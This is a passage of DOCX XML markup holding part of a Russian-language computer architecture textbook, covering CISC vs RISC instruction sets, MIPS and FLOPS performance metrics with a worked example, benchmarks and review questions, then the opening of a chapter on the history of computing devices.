        <w:t xml:space="preserve"> (или AMD64, потому что AMD первой его сделала, к ужасу Intel).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Особенности</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**CISC** (Complex Instruction Set Computer) — сложная система команд, есть инструкции для всего</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Используется в большинстве ПК, ноутбуков, серверов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Обратная совместимость: программы для 8086 (1978!) теоретически могут работать на современном i9</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>ARM (Advanced RISC Machine)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ARM</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это архитектура, используемая в мобильных устройствах, встраиваемых системах, а теперь и в ноутбуках (привет, Apple M1/M2/M3).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Особенности</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**RISC** (Reduced Instruction Set Computer) — упрощённая система команд, каждая инструкция проста и быстра</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Энергоэффективность: меньше потребление, меньше тепловыделение</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Используется в смартфонах (все iPhone и Android), планшетах, роутерах, умных чайниках</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>RISC-V</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>RISC-V</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — новая открытая архитектура, набирающая популярность.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Особенности</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Открытая спецификация (не нужно платить лицензионные отчисления)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Модульная: можно собрать процессор под конкретную задачу</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Используется в исследованиях, встраиваемых системах, постепенно проникает везде</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 4: Сравнение выполнения операции на CISC и RISC</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача</w:t>
      </w:r>
      <w:r>
        <w:t>: Нужно выполнить операцию «прибавить значение из памяти к регистру». Сравним подходы x86 (CISC) и ARM (RISC).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>x86 (CISC)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>ADD EAX, [1000h]    ; Одна инструкция: читает из памяти и складывает</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>1 инструкция</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сложная: читает память, складывает, записывает результат</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Выполняется за несколько тактов (зависит от кэша)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ARM (RISC)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>LDR R1, [R2]        ; Загрузить из памяти в регистр R1</w:t>
        <w:br/>
        <w:t>ADD R0, R0, R1      ; Сложить R0 и R1, результат в R0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>2 инструкции</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Каждая простая: выполняется за 1 такт (в идеале)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Итог</w:t>
      </w:r>
      <w:r>
        <w:t>: CISC — меньше инструкций, но каждая сложнее. RISC — больше инструкций, но каждая проще и быстрее. Что лучше? Зависит от задачи. На практике современные CISC процессоры внутри разбивают сложные инструкции на простые микрооперации (привет, микроархитектура!).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Производительность: как считать правильно</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Финальный вопрос: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>как оценить реальную производительность</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> процессора? Есть несколько метрик.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>MIPS и GIPS</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>MIPS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Million Instructions Per Second) — миллионы инструкций в секунду.  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>GIPS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Giga Instructions Per Second) — миллиарды инструкций в секунду.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>MIPS = (Тактовая частота × IPC) / 1 000 000</w:t>
        <w:br/>
        <w:t>GIPS = (Тактовая частота × IPC) / 1 000 000 000</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема</w:t>
      </w:r>
      <w:r>
        <w:t>: Разные инструкции на разных архитектурах делают разное. Сложение на ARM ≠ сложению на x86. Поэтому MIPS — это «Meaningless Indication of Processor Speed» (бессмысленный индикатор скорости процессора), как шутят программисты.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>FLOPS</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>FLOPS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Floating Point Operations Per Second) — операций с плавающей точкой в секунду. Используется для оценки производительности в научных вычислениях.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**MFLOPS** = миллион FLOPS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**GFLOPS** = миллиард FLOPS (гигафлопс)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**TFLOPS** = триллион FLOPS (терафлопс)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**PFLOPS** = квадриллион FLOPS (петафлопс)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 5: Расчёт теоретической производительности в FLOPS</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача</w:t>
      </w:r>
      <w:r>
        <w:t>: Процессор имеет 8 ядер, каждое работает на частоте 3 ГГц. Каждое ядро может выполнять 16 операций с плавающей точкой за такт (благодаря векторным инструкциям AVX-512). Какова теоретическая пиковая производительность?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>FLOPS = Количество ядер × Частота × Операций за такт</w:t>
        <w:br/>
        <w:t>FLOPS = 8 × 3 ГГц × 16</w:t>
        <w:br/>
        <w:t>FLOPS = 8 × 3 × 10⁹ × 16</w:t>
        <w:br/>
        <w:t>FLOPS = 384 × 10⁹</w:t>
        <w:br/>
        <w:t>FLOPS = 384 GFLOPS = 0.384 TFLOPS</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ</w:t>
      </w:r>
      <w:r>
        <w:t>: 384 гигафлопс (или 0.384 терафлопс).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примечание</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>теоретический пик</w:t>
      </w:r>
      <w:r>
        <w:t>. На практике достичь его невозможно из-за задержек памяти, ветвлений в коде и других факторов. Реальная производительность обычно 30-70% от пика.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Benchmark-тесты</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Benchmark</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это стандартный набор задач, на которых тестируют производительность. Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**SPEC CPU** — тесты процессора на разных задачах</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Geekbench** — популярный кроссплатформенный бенчмарк</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Cinebench** — тест рендеринга 3D-сцен</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**3DMark** — тесты графики и игр</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Важно</w:t>
      </w:r>
      <w:r>
        <w:t>: Не существует единого числа, описывающего производительность. В одних задачах быстрее ARM, в других x86. Поэтому смотри бенчмарки, релевантные твоей задаче.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Практическая значимость</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Зачем всё это знать?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Выбор железа**: Понимая архитектуру, ты не купишь процессор с 16 ядрами по 2 ГГц для игр (где важна частота одного ядра), а не количество ядер.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Оптимизация программ**: Зная про кэш и задержки памяти, ты можешь оптимизировать алгоритмы так, чтобы они работали в 10-100 раз быстрее.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Портирование ПО**: Понимая разницу между x86 и ARM, ты не удивишься, почему программа работает на ПК, но не на Raspberry Pi.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Отладка**: Знание архитектуры помогает понять, почему программа падает с segmentation fault (обращение к несуществующему адресу).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Карьера**: Разработчики ОС, компиляторов, драйверов, встраиваемых систем **обязаны** знать архитектуру. Это не просто «для общего развития».</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Ключевые термины и определения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Архитектура ЭВМ** — концептуальное представление компьютера, видимое программисту (система команд, регистры, типы данных).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Структура ЭВМ** — физическая реализация архитектуры (конкретные схемы, количество ядер, организация кэша).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Процессор (CPU)** — центральное вычислительное устройство, выполняющее программы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**АЛУ (арифметико-логическое устройство)** — часть процессора, выполняющая арифметические и логические операции.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Устройство управления (УУ)** — часть процессора, управляющая выполнением инструкций.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Регистр** — сверхбыстрая ячейка памяти внутри процессора.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Системная магистраль (шина)** — набор линий связи между компонентами компьютера.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Шина данных** — передаёт данные между компонентами.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Адресная шина** — передаёт адреса ячеек памяти.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Шина управления** — передаёт управляющие сигналы (чтение/запись, прерывания и т.д.).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Разрядность процессора** — количество бит, обрабатываемых за одну операцию.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Тактовая частота** — количество тактов процессора в секунду (измеряется в Гц).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Пропускная способность** — объём данных, передаваемых за единицу времени.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Время доступа (латентность)** — задержка между запросом данных и их получением.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**CISC** (Complex Instruction Set Computer) — архитектура со сложным набором команд (пример: x86).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**RISC** (Reduced Instruction Set Computer) — архитектура с упрощённым набором команд (пример: ARM, RISC-V).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**IPC** (Instructions Per Cycle) — количество инструкций, выполняемых за один такт.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**FLOPS** (Floating Point Operations Per Second) — операций с плавающей точкой в секунду.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Контрольные вопросы для самопроверки</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Концептуальный вопрос**: Объясните разницу между архитектурой и структурой ЭВМ. Приведите пример двух процессоров с одинаковой архитектурой, но разной структурой.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Практическая задача**: Процессор имеет 32-битную адресную шину. Сколько байт памяти он может адресовать? Почему 32-битные версии Windows не могут использовать более 4 ГБ RAM?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача на вычисление**: Оперативная память DDR5-6400 имеет 64-битную шину данных и работает на эффективной частоте 6400 МГц. Рассчитайте её теоретическую пропускную способность в ГБ/с.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача на архитектуры**: Процессор ARM работает на частоте 2 ГГц и выполняет в среднем 3 инструкции за такт. Процессор x86 работает на частоте 3.5 ГГц и выполняет 2 инструкции за такт. Какой из них выполняет больше инструкций в секунду? Означает ли это, что он быстрее во всех задачах?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Сложный вопрос**: Почему, несмотря на огромный рост тактовых частот (от 1 МГц в 1970-х до 5 ГГц сейчас), производительность процессоров выросла ещё сильнее? Какие архитектурные приёмы, помимо увеличения частоты, повышают производительность? (Подсказка: конвейеризация, кэш, многоядерность)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Связь с другими главами</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 1.2 (Представление данных в памяти) — организация памяти и адресация</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 1.6 (Алгебра высказываний) — логические элементы, из которых строится АЛУ</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 2.2 (История ЭВМ) — эволюция архитектур от первых компьютеров до современных</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 2.3 (Принципы фон Неймана) — фундаментальные принципы организации ЭВМ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>_Глава подготовлена в соответствии со спецификацией учебника. Объём: ~14500 символов._</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 2.2: История развития вычислительной техники. Поколения ЭВМ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Введение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>В прошлой главе мы разобрались, как устроен современный компьютер: процессор, память, шины — всё по полочкам. Но откуда вообще взялись эти железные монстры, пожирающие электричество и твоё свободное время? Как человечество дошло от счётов на верёвочках до того, что твой смартфон мощнее суперкомпьютеров 1990-х годов?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">История вычислительной техники — это не просто «когда-то давно был компьютер размером с дом». Это история того, как люди пытались автоматизировать самую скучную штуку на свете — </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>вычисления</w:t>
      </w:r>
      <w:r>
        <w:t>. Потому что считать вручную — это боль. А ещё это путь от ламповых монстров, жравших киловатты, до процессоров в твоих наушниках.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">В этой главе мы пройдём через </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>пять поколений ЭВМ</w:t>
      </w:r>
      <w:r>
        <w:t>, узнаем, кто такой Чарльз Бэббидж и почему его машина не взлетела (спойлер: деньги кончились), а также выясним, почему твой процессор не работает на 10 ГГц, хотя по закону Мура уже должен был бы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Эта глава тесно связана с главой 2.1 (Архитектура ЭВМ), где мы говорили про современное устройство компьютера, и главой 2.3 (Принципы фон Неймана), потому что все компьютеры с 1940-х годов строятся по одним и тем же базовым принципам.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Предыстория: когда компьютеры были деревянными</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Счёты и абак</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Первый «компьютер» — это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>абак</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (счёты), придуманный ещё в Древнем Вавилоне около 3000 лет назад. Принцип простой: косточки на спицах, двигаешь их туда-сюда — считаешь. В СССР были русские счёты (те самые, с деревянными костяшками), и бухгалтеры щёлкали на них быстрее, чем ты набираешь на калькуляторе.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы</w:t>
      </w:r>
      <w:r>
        <w:t>: не требует электричества, не зависает, не обновляется в самый неподходящий момент.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы</w:t>
      </w:r>
      <w:r>
        <w:t>: попробуй на них вычислить интеграл.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Логарифмическая линейка</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">В XVII веке изобрели </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>логарифмическую линейку</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — две линейки с логарифмическими шкалами, двигаешь одну относительно другой — получаешь умножение, деление, возведение в степень. До 1970-х годов инженеры и учёные носили её в кармане вместо калькулятора.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Интересный факт</w:t>
      </w:r>
      <w:r>
        <w:t>: Инженеры NASA, которые отправляли людей на Луну, считали траектории на логарифмических линейках. Они, кстати, тоже ошибались, но реже чем ты в контрольной.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Арифмометр</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">В XVII-XIX веках появились </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>механические арифмометры</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — устройства с шестерёнками, которые могли складывать, вычитать, умножать и делить. Знаменитая машина Паскаля (1642 год) — одна из первых. Крути ручку — получаешь результат.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема</w:t>
      </w:r>
      <w:r>
        <w:t>: Для каждого вычисления нужно было вручную настраивать механизм. А если нужно сделать 1000 операций подряд? Удачи.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Аналитическая машина Бэббиджа: прадедушка компьютера</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
